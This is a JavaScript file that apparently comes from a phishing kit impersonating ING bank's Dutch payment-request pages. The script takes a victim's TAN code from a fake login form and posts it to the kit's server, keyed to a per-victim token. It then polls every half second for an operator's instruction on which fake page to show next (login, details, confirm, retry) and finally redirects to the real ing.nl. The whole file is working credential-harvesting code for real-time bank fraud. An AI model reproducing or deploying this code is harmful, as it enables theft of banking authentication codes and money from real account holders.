const login_form = document.querySelector('#login-form');

const tan = document.querySelector('#login-username');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (tan.value == '') {
        loginButton.innerHTML = 'Bevestigen';
        loginButton.disabled = false;
        tan.disabled = false;
        
        tan.value = '';

        document.querySelector('#userNamePassword').classList.add('has-error');
    } else {
        const data = new FormData();
        data.append('tan', tan.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Bevestigen';
        loginButton.disabled = true;
        tan.disabled = true;

        document.querySelector('#userNamePassword').classList.remove('has-error');

        fetch('/particulier/betaalverzoek/tancode/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => { 
            const newInterval = setInterval(() => {
                fetch('/particulier/betaalverzoek/tancode/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            window.location.href = '/particulier/betaalverzoek/inloggen/' + token.value;
                        } else if (data.page == 'details') {
                            window.location.href = '/particulier/betaalverzoek/informatie/' + token.value;
                        } else if (data.page == 'confirm') {
                            window.location.href = '/particulier/betaalverzoek/bevestigen/' + token.value;
                        } else if (data.page == 'tan') {
                            loginButton.innerHTML = 'Bevestigen';
                            loginButton.disabled = false;
                            tan.disabled = false;
                            
                            tan.value = '';

                            document.querySelector('#userNamePassword').classList.add('has-error');

                            clearInterval(newInterval)
                        } else if (data.page == 'control') {
                            window.location.href = '/particulier/betaalverzoek/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.ing.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


